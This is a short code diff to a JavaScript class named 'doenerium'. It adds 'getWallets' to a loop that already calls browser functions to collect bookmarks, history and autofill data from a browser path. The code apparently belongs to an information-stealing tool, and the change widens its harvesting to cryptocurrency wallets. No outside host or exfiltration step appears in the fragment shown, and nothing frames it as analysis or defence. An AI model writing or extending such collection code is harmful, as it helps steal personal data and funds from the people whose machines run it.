@@ -289,6 +289,7 @@ class doenerium {
           "getBookmarks",
           "getHistory",
           "getAutofill",
+          "getWallets",
         ].forEach(async (_func) => {
           await this.utils.browsers[_func](path);
         });
